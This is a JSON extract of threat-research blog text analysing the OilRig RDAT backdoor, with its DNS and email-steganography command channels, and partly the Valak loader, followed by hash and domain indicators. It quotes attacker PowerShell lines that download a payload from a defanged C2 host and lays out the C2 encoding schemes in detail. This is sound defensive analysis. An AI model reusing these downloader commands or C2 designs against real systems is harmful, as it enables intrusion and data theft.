                "This email-based C2 channel is novel in its design, as it relies on steganography to hide commands and exfiltrates data within BMP images attached to the emails.",
                "The combination of using emails with steganographic images to carry the data across the C2 can result in this activity being much more difficult to detect and allow for higher chances of defense evasion."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected by WildFire and Cortex XDR, which identifies all RDAT samples as malicious, as well as DNS Security and URL Filtering, which identifies and blocks the C2 activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We first discovered the existence of RDAT on October 7, 2017, when we observed it being uploaded to a webshell 11 days after we had published our research exposing webshell activity by this adversary.",
                "We believe the group attempted to use the RDAT payload for continued access to the server once the use of the webshell was exposed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In April 2020, we observed activity involving the potential breach of a telecommunications organization in the Middle East.",
                "The files associated with this activity included custom Mimikatz samples for dumping credentials, a sample of the Bitvise client we believe was used to create SSH tunnels, and a custom backdoor called RDAT.",
                "From the initial RDAT sample we collected, we were able to expand the sample set and relate previously seen ISMDOOR samples as well.",
                "Given the combination of the use of RDAT in OilRig-related webshells, code similarities and tactical similarities, we are confident RDAT is a tool deployed by OilRig."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Two of the related tools collected had PDB paths similar to ones we had seen in the past.",
                "The PDB paths were C:\\Users\\Void\\Desktop\\dns\\client\\x64\\Release\\client.pdb and C:\\Users\\Void\\Desktop\\RDAT\\client\\x64\\Release\\client.pdb, the latter of which is the basis of the tool name.",
                "Using the file path of the user in the PDB string of C:\\Users\\Void\\Desktop as shown in Figure 1, we gathered over a dozen samples with that file path, with most of the samples identified as a known OilRig tool called ISMDOOR.",
                "Considering the small cluster of related tools, it is highly likely these have been developed by a single adversary or adversary group with control over the codebase."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Pivots from PDB strings"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also observed PowerShell downloaders attempting to retrieve files from the domain digi.shanx[.]icu."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2. PowerShell and infrastructure overlaps"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In Symantecs Greenbug report, once the adversary gained interactive access to target hosts, they were observed executing PowerShell commands to perform post-exploitation activities.",
                "In one instance, a Powershell script was executed to retrieve RDAT from the C2 apps.vvvnews[.]com, save it to C:\\Programdata\\Nt.dat, and move it to C:\\Programdata\\Vmware\\VMware.exe as seen in the following snippet:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews .com:8080/Yf.dat', 'C:\\Programdata\\Nt.dat');"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "move C:\\Programdata\\Nt.dat C:\\Programdata\\Vmware\\VMware.exe -force;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our research, we collected a very similar PowerShell script using a different C2 and with some variations in commands, but with the same file path of C:\\Programdata\\Nt.dat:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "$WebClient = New-Object System.Net.WebClient; $WebProxy = New-Object System.Net.WebProxy('http://192.168.3.4:8080',$true); $WebClient.",
                "Proxy = $WebProxy;Try {$WebClient.DownloadFile('http://digi.shanx[.]icu:8080/Nt.dat','C:\\Programdata\\Nt.dat')} Catch {$_.Exception.",
                "Message | out-file C:\\Programdata\\Exceptions.dat};"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unfortunately, we could not verify the contents of Nt.dat due to the C2 server http://digi.shanx[.]icu:8080 being unavailable at the time of analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The adversaries compiled the RDAT payloads used in the attacks on the Middle Eastern telecommunications organization on March 1, 2020, and configured it to use a domain provided on the command line or the hardcoded domain rsshay[.]com as its C2 server.",
                "Unlike previous RDAT samples, this particular sample only uses DNS tunneling for its C2 communications with no HTTP fallback channel.",
                "This RDAT sample can only use TXT queries in its DNS tunnel and will issue queries structured like the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<encoded data>.<encoding method, 0 for base64 or 1 for base32><encryption key>.<C2 domain>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The encoded data portion of the subdomain is encoded base32 if the actor includes a command line argument 1  otherwise, it uses base64.",
                "The payload also substitutes characters within the base64 encoded subdomain to avoid including characters that are not allowed in domain names, such as = with -, / with _ and + with -a.",
                "For example, we observed the following beacon during our testing:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "91mzXgXT-a9sLktr-aOz8pAw--.0R2.rsshay[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The encoded data in the beacon (subdomain) is ciphertext generated using AES and a 16-byte key generated by concatenating two randomly chosen alphanumeric characters that are also present in the subdomain immediately before the C2 domain.",
                "For instance, if the two random alphanumeric characters included in the subdomain were R2, the payload would use the string R2R2R2R2R2R2R2R2 as a key to encrypt the data.",
                "The example beacon above would decrypt to 1,6,1.0_Y,2619, which is structured as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<communications type value>,<ID value from config>,<hardcoded payload version>,<randomly generated number>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload decodes the response for an answer to the TXT query with base64 and decrypts using the same AES cipher and key as the request.",
                "The payload attempts to parse the decrypted cleartext using the regular expression [^,]+ to get the command value and the command arguments that are split with a comma.",
                "The payload then checks the command value using a command handler that has the ability to execute commands and upload and download files, as seen in Table 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1.",
                "Commands available in RDAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our research, we gathered several additional samples by pivoting on the contents of the executables and other various attributes.",
                "Table 2 shows when these samples were compiled, their respective C2 server and the service name they use when the actor installs them on the compromised system.",
                "As shown by the compilation times, this tool has been in development since 2017, with the most recent sample we collected being compiled in April 2020.",
                "The sample compiled in August 2017 was uploaded to a webshell related to TwoFace, while the samples compiled in March 2020 were used in the attack on the Middle Eastern telecommunications organization.",
                "The RDAT sample compiled in April 2020 was also delivered to the same telecommunications organization, which was configured to use new infrastructure (sharjatv[.]com, wwmal[.]com) and supported both DNS A and AAAA records for its DNS tunneling C2 channel."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The most interesting sample we discovered was compiled on July 24, 2018.",
                "This sample included a novel C2 channel that used the Exchange Web Services (EWS) API to send and receive emails containing steganographic images as attachments.",
                "This novel C2 channel supplemented the HTTP and DNS tunneling C2 channels seen in other RDAT samples, all of which we will discuss in detail in the upcoming sections."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2. Related RDAT samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The novel C2 channel in the RDAT sample uses email for a C2 channel by interacting with the local Exchange server with the EWS API.",
                "There are two hardcoded actor-controlled email addresses: koko@acrlee[.]com and h76y@acrlee[.]com.",
                "These two email addresses are used by the RDAT payload to send and receive emails to facilitate C2.",
                "To send emails from the compromised host, the payload uses the email associated with the account logged into the compromised host, as it uses the WinHTTP library to make requests to the API with the \"WINHTTP_OPTION_AUTOLOGON_POLICY\" field set to 'WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW', which automatically attempts to log onto Exchange using the default credentials."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The actor communicates with the payload by sending emails from one of two email addresses to the email address of the compromised account.",
                "To receive emails from the actor, the payload will:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To communicate with the actor, the payload sends emails from the account logged into the compromised system and performs the following actions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To show this channel, we analyzed the outbound HTTP POST requests to the EWS API and took screenshots of the requests.",
                "The POST requests all have an anomalous User-Agent of firefox and use Simple Object Access Protocol (SOAP) messages to interact with the Exchange server.",
                "The first request has a SOAP message to create an inbox rule named \"ExchangeRule\" that moves all inbound emails from the C2 email addresses to the \"junkemail\" folder.",
                "Figure 3 shows the HTTP POST request containing the SOAP message that creates this inbox rule.",
                "The rule name is highlighted in the red box, the condition that includes the actors email address in the blue box and the action to move it to the junk folder in the green box."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. HTTP POST request creating the inbox rule to move emails from actor to the junk folder"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will then continually look for new emails from the actor in the junk folder.",
                "The payload will issue a request to the EWS API to check for unread emails from the actors email addresses with an attachment.",
                "Figure 4 shows the HTTP POST the payload issues to check for inbound emails from the actor, with the actors email address in the red box, the check for an attachment in the blue box and the junk folder specified in the green box."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. HTTP POST request sent to the Exchange server looking for inbound emails from actor"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the payload obtains an email sent by the actor, the payload will process the response to the SOAP request and send additional requests to the EWS API to get the email, the attachment and the contents of the attachment.",
                "The payload processes the responses to these requests using regular expressions to find specified values within the XML.",
                "The payload uses the regular expressions to find the following values within the servers response:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It then saves this content to a file in the %TEMP% folder with a \".bmp\" file extension.",
                "It then issues a SOAP request to delete the processed email.",
                "This completes the process in which the payload receives inbound communications from the actor."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To send its beacon and exfiltrate data to the actor, the payload will interact with the EWS API to perform the following three steps:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5 shows the draft email with the BMP image attached immediately prior to being sent.",
                "The figure shows the actors email address in the To field, the BMP image with hidden data as the attachment, and subjects and message bodies containing strings of an unknown purpose."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5. Screenshot of Outlook Web App showing the email draft created by the payload prior to it being sent to the actor"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To carry out this functionality, the payload creates an email and saves it as a draft.",
                "This allows it to attach the image containing the hidden data prior to sending the email.",
                "Figure 6 shows the SOAP request to the EWS API, specifying that the server should save the email to the drafts folder in the red and blue boxes and the actors email address in the green box."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6.",
                "HTTP POST request creating the email draft prior to attaching the image"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the email saved in the drafts folder, the payload will then attach the BMP image to the email using an HTTP POST request to the EWS API.",
                "Figure 7 shows the request to the EWS API that includes the filename of the attachment in the red box and the base64 content of the attachment in the blue box."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7. HTTP POST request attaching the image to the email draft"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload issues one last request to the EWS API to send the email draft with the attached BMP image to the actor.",
                "Figure 8 shows the HTTP POST request issued by the payload to send the email with the SendItem action highlighted in the red box."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8.",
                "HTTP POST request sending the email draft to the actor\u2019s email address"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will receive data from and exfiltrate data to the C2 within email attachments, specifically within the BMP images that use steganography to hide the data within the image.",
                "The method with which the payload extracts data from the BMP image to receive data from the C2 is the same as its method for hiding data to exfiltrate.",
                "While we did not observe the C2 using this method to send commands, we were able to analyze the payload to determine how it would send messages and exfiltrate data from the system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To send data using this C2 channel, the payload will read the following image available on a default install of Windows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\ProgramData\\Microsoft\\User Account Pictures\\guest.bmp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Depending on the version of Windows, the guest.bmp image differs in size and contents.",
                "The image from Windows 7 is 128x128 pixels and contains an image of a suitcase, while the Windows 10 image is 448x448 pixels and contains a generic user icon.",
                "Figure 9 shows the two images extracted from default installations of Windows 7 and 10 with the latter scaled down in size."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9.",
                "The \u201cguest.bmp\u201d image from Windows 7 on the left and Windows 10 on the right"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload determines the height, width and color depth of the image and calculates how many images it will need to modify to send the entirety of the data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "(length of data)/(width*(height-1))"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It uses the modulo operator to check if there is data that does not fit in the previous image and will add one to the required image count if leftover data exists.",
                "The payload then iterates through the data by grabbing a substring of the data that will fit within the image."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To explain how the payload hides data within this image, we must first briefly explain the BMP file format.",
                "The BMP file format includes file headers and an array of values used to store the red, green and blue color values of each pixel in the image.",
                "The format of each color value in the array of color values varies depending on the color depth, as 24-bit BMP images will use 3-byte values that are used to specify the intensities of red, blue and green colors for each pixel in the image, while 32-bit images use 4-byte values.",
                "The RDAT payload can support both 24- and 32-bit images.",
                "Since both guest.bmp images from Windows 7 and 10 are 24-bit images, we observed the payload using the 3-byte color values for each pixel to hide data.",
                "The payload will modify each pixels 3-bytes to transmit one byte of exfiltrated data.",
                "By spreading the data byte over the 3-bytes for each pixel, the impact on the original image is minor and difficult to visualize.",
                "Figure 10 compares the original image from Windows 7 and the modified image carrying the hidden data."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10.",
                "Original \u201cguest.bmp\u201d image from Windows 7 on the left and the modified carrier image on the right"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10 shows how difficult it is to see the hidden data embedded within the BMP image.",
                "We zoomed in on the 29 pixels modified to carry the data to visualize the differences and found that they differed slightly in color, as seen in the comparison in Figure 11.",
                "All the pixels in the two images are different.",
                "However, some of the differences in color are more obvious than others."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 11.",
                "This zoomed-in view shows the original pixels on top and pixels carrying 29-bytes of data on the bottom"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To hide the data within the image, the payload will check the color depth of the guest.bmp image for either 24- or 32-bit depth, which allows the payload to determine how many bytes per pixel it will need to spread the bits of the hidden data across.",
                "For instance, a 24-bit BMP image like \"guest.bmp\" from Windows 7, seen in Figure 10 above, will have three bytes per pixel in the image that represents the red, green and blue values for that pixel.",
                "Using this 24-bit image, the payload will spread the 8-bits of the data byte across these three bytes, specifically by setting the least significant bit values in the pixel bytes to the bit values of the data byte."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Let's use the example data 8,54351-1616479009,0 from a beacon sent from the payload to the C2, which it will encode using base64 to OCw1NDM1MS0xNjE2NDc5MDA5LDA=, append the @ symbol and embed within a BMP image.",
                "The O ASCII character has a hexadecimal value of 0x4f, which is 01001111 in base2.",
                "The 8-bits of this base2 representation are then used to set specific bits within the 3-bytes for each pixel:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using this logic, the payload will read the pixel bytes from the guest.bmp image, which is 0xe4, 0xdf and 0xb9 and replace the following bits using the base2 of 010 011 11 for O:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 12 below shows how these bit replacements occur and how the replacements ultimately change the values of the pixel's bytes."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 12.",
                "Visual explanation of the bit replacement performed on each pixel to hide data in the BMP images"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The RDAT sample with the novel EWS C2 channel also had HTTP and DNS tunneling as C2 channels as well, which are very similar to other RDAT samples we collected.",
                "The HTTP C2 channel uses HTTP POST requests to transmit data to the C2 server.",
                "The code contains the following two domains:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "allsecpackupdater[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tacsent[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It should be noted that the code only attempts to use the tacsent[.]com domain for its HTTP C2 channel.",
                "We are unsure why the code contains the allsecpackupdater[.]com domain as it does not attempt to communicate with it, but it is possible that it is an artifact from a previous version of the tool.",
                "This domain was previously tied to the OilRig threat group, as ClearSky discovered this domain in 2017 and noted its relation to Greenbugs ISMDOOR tool."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The HTTP POST requests have a custom \"From:\" field in the header that has a unique identifier assigned to the infected system.",
                "The HTTP POST request will contain a \"v\" parameter and a random number in the URL and a user-agent of \"chrome.\"",
                "Figure 13 shows an example of an HTTP POST issued by the payload as its initial beacon to the C2, which shows the anomalous user-agent chrome and custom From field."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 13.",
                "Initial beacon sent by RDAT sample over its HTTP C2 channel"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload encrypts the data sent in the POST request using the AES cipher, specifically in CBC mode.",
                "To decrypt this data, the data itself is first converted from the URL-safe hexadecimal percent encoded characters to their /, + and = character equivalent.",
                "After this conversion, the resulting data is decoded using base64 and then decrypted using AES and the value in the From field as a key and initialization vector (IV).",
                "For instance, using the From value for the key and IV to decrypt the POST data with the AES cipher produces the following cleartext:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1,1543511637567325,12031\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload will check the C2 server's response to this HTTP POST for a , using a regular expression [^,]+ to determine if the C2 provided a command.",
                "The payload can only exfiltrate 102,400 bytes of data at a time, which it uses a field in the exfiltrated response to notify the C2 of the offset of the data so the C2 can reconstruct it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DNS tunneling protocol is very similar to the protocol discussed earlier in this blog, as it uses the second level subdomain for its AES key but uses four characters instead of two.",
                "It also uses the same character replacement of = with -, / with _ and + with -a to remove characters that are not allowed in domain names, as did the RDAT sample used in the attacks on the Middle Eastern telecommunications organization.",
                "The DNS tunnel for this sample used DNS A record queries and the same domain as the HTTP C2 channel, which generates an initial beacon that will resemble the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "P9rktZsukI5RVAdZWSR-a6uVYKeQJ-azhVLzUUfGs1TDQ-.fN26.tacsent[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To decrypt this beacon, the C2 uses the second level subdomain to create an AES key and IV of fN26fN26fN26fN26, which is the second-level domain used four times to create a 16-byte string.",
                "The resulting cleartext would contain the following message, which is a comma-separated string that includes communication type and a unique system identifier:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3,1543511637567325,0\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To exfiltrate data using this DNS tunneling protocol, the payload will add additional subdomains to query, specifically a field for the data sequence number and a field for the exfiltrated data.",
                "For instance, the following DNS query sends system information to the C2:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1.44gkxXizTF3QJU0F2AllV_0qhr1xcYmy8GeMB6nnGNSw0bls7JpP0zIqvnyO.xEZlrurmSHgf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "uoAcqi9blguWDzwH9oQCWZ-aTeBSBE2M-.tJ8z.tacsent[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The fifth-level subdomain is a data sequence number that allows the C2 server to reassemble the data, which will start with 1 and increment by 60 as the DNS tunneling protocol sends 60-bytes of encoded ciphertext within each DNS request.",
                "The fourth-level subdomain contains the 60-bytes of encoded ciphertext that RDAT sends to the C2, while the third- and second-level subdomains are the same as the beacon.",
                "In the above example, the AES key and IV would be tJ8ztJ8ztJ8ztJ8z, which would decrypt the third-level subdomain to the following cleartext:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2,1543511637567325,0\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using the same AES key and IV, the cleartext in the fourth-level subdomain includes the system information, which in the above example would produce:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1:|2:MicrosoftWindows7Professionw\\x01"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Regardless of the C2 channel used, the RDAT sample parses responses using a command handler to determine the course of action to take.",
                "Table 3 shows the commands available within the command handler, as well as the structure of the response message the payload would send to the C2.",
                "The command handler in this RDAT sample has more capabilities compared to the three commands available in the sample seen in the attacks on the Middle Eastern telecommunications organization."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3. Commands available within the RDAT sample that used the novel EWS C2 channel"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The RDAT backdoor has been used by the OilRig threat group for at least three years to target organizations in the Middle East, with the most recent known activity occurring in April 2020 against a telecommunications organization.",
                "Over the course of three years, this tool has received continued development efforts that have resulted in multiple variations with differences in functionality and available C2 channels.",
                "The majority of samples used some combination of HTTP and DNS tunneling channels, with the single exception where we discovered the developer leveraging Exchange Web Services to send and receive emails to and from the actor using steganographic image file attachments.",
                "The use of a novel C2 channel in combination with steganography shows the continued evolution and development of different tactics and techniques by this adversary over time."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec -",
                "RDAT backdoor"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e53cc5e62ba15e43877ca2fc1bee16061b4468545d5cc1515cb38000e22dd060",
                "- Custom Mimikatz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "476b40796be68a5ee349677274e438aeda3817f99ba9832172d81a2c64b0d4ae",
                "- Bitvise client"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78584dadde1489a5dca0e307318b3d2d49e39eb3987de52e288f9882527078d5",
                "- PowerShell downloader"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7395a3ada245df6c8ff1d66fcb54b96ae12961d5fd9b6a57c43a3e7ab83f3cc2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8f943bc5b20517fea08b2d0acc9afe8990703e9d4f7015b98489703ca51da7eb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8120849fbe85179a16882dd1a12a09fdd3ff97e30c3dfe52b43dd2ba7ed33c2a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bcdb63b3520e34992f292bf9a38498f49a9ca045b7b40caab5302c76ca10f035"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f42c2b40574dc837b33c1012f7b6f41fcccc5ebf740a2b0af64e2c530418e9e0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fcabb86331cd5e2fa9edb53c4282dfcb16cc3d2cae85aabf1ee3c0c0007e508c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7b5042d3f0e9f077ef2b1a55b5fffab9f07cc856622bf79d56fc752e4dc04b28"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "de3f1cc2d4aac54fbdebd5bd05c9df59b938eb79bda427ae26dedef4309c55a9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "acb50b02ab0ca846025e7ad6c795a80dc6f61c4426704d0f1dd7e195143f5323"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "55282007716b2b987a84a790eb1c9867e23ed8b5b89ef1a836cbedaf32982358"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ba380e589261781898b1a54c2889f3360db09c61b9155607d7b4d11fcd85bd9d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6322cacf839b9c863f09c8ad9fd0e091501c9ba354730ab4809bb4c076610006"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "rdmsi[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "rsshay[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sharjatv[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "wwmal[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "allsecpackupdater[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tacsent[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "acrlee[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kopilkaorukov[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "digi.shanx[.]icu"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tprs-servers[.]eu"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "oudax[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kizlarsoroyur[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "intelligent-finance[.]site"
            ]
        }
    ],
    "74305a769d07d333523972d1d3d341732e95fb90": [
        {
            "type": "paragraph",
            "content": [
                "First noted in late 2019, Valak is an information stealer and malware loader that has become increasingly common in our threat landscape.",
                "From April through June of 2020, we saw waves of Valak malware two to four times a week on average through an email distribution network nicknamed Shathak or TA551.",
                "Characteristics of Valak include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog covers the history of Valak, reviews the chain of events for an infection, examines traffic generated by Valak and explores recent updates in obfuscation techniques used by the malware in order to evade detection.",
                "This blog also examines the Shathak/TA551 distribution system that has been consistently pushing Valak since April 2020."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from Valak by our Threat Prevention subscription for the Next-Generation Firewall."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The earliest public record of Valak comes from Proofpoint's ET Pro ruleset, where two rules detecting Valak were introduced on October 22, 2019, for the Suricata Open Source threat detection engine."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Valak was documented as follow-up malware during an Ursnif infection (also known as Gozi or IFSB) on December 19, 2019.",
                "Analysis by Cybereason revealed Valak used a combination of techniques to remain persistent on an infected Windows host.",
                "Valak relies on scheduled tasks combined with Windows registry updates.",
                "It also uses Alternate Data Stream (ADS) during the infection process for follow-up malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Most examples of Valak in recent months have been distributed through malicious spam (malspam).",
                "SentinelLabs (SentinelOne) published a report providing further information about Valak, including a connection between Valak malware distribution and campaigns similar to the Gozi ConfCrew.",
                "Distribution characteristics were further explored in a Threat Spotlight on Valak published by Talos (Cisco)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The distribution network using malspam to push Valak has been called Shathak on Twitter.",
                "Shathak has been attributed to an actor named TA551 on the Malware Dont Need Coffee blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 shows the chain of events seen for Valak infections in June and early July 2020.",
                "For a Windows computer to become infected, a victim must:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For Valak infections during June 2020, the initial activity consisted of:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6 reveals variable names are obfuscated in the JavaScript configuration file.",
                "This is an example of obfuscation that we have noted since June 2020, and it is covered in more detail later in this blog when discussing Valak developments."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As the infection progressed, three things happened near-simultaneously to make Valak persistent on an infected Windows host:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the C2 domains remained active during the infection, as early as four minutes later, we saw follow-up malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In our tests, running Valak from a U.S. location on a vulnerable Windows 10 host returned a banking Trojan called IcedID as the follow-up malware.",
                "In one case, we saw both IcedID and NetSupport Manager RAT-based malware delivered as follow-up malware on a Windows 7 host from June 2020."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The infection starts when a victim enables macros on one of the malicious documents.",
                "This usually generates a URL ending with .cab that returns a Windows DLL file.",
                "Figure 14 shows a Valak infection from June 24, 2020, filtered in Wireshark to list the HTTP requests and other web-based traffic.",
                "The first line shows a URL that ends with .cab.",
                "A TCP stream of this activity is shown in Figure 15, and it reveals signs of an EXE or DLL file returned from the server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Checking the binary in VirusTotal shows this file is a DLL.",
                "This DLL is an installer for Valak.",
                "Shortly after the initial HTTP traffic for the Valak DLL, we see other HTTP GET requests starting with:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The HTTP requests are Valak C2 traffic, which is sent to decoy domains (non-malicious domains from legitimate organizations) and malicious domains.",
                "These domains are listed in the initial Valak script previously shown in Figure 5.",
                "For example, for Valak infections from the June 24, 2020, wave, the decoy domains were:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Also noted in Figure 5 are the malicious domains from the June 24, 2020, wave of Valak:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5 also shows three additional domains from the June 24, 2020, wave of Valak.",
                "These domains appear to be fake or possibly placeholders because they were not registered and did not resolve to any IP address."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Valak C2 traffic returns data as encoded ASCII text that is decoded on the victim host and saved as malware items like script files, EXE used during the infection and data for registry updates for the Valak infection.",
                "Figure 16 shows an example of this traffic."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to HTTP GET requests, Valak uses HTTP POST requests to exfiltrate certain types of data.",
                "In Figures 17 and 18, we see an HTTP POST request starting with class4.aspx?internalService= that sends login credentials used for Microsoft Outlook from an infected Windows host."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We primarily see IcedID as follow-up malware from the Valak infections generated from U.S. locations.",
                "Figure 19 shows indicators of IcedID during the Valak infection traffic."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As Valak has developed, we have noticed increased obfuscation in the Valak configuration script.",
                "This obfuscation finds its way into other script and Windows registry updates used to keep the infection persistent.",
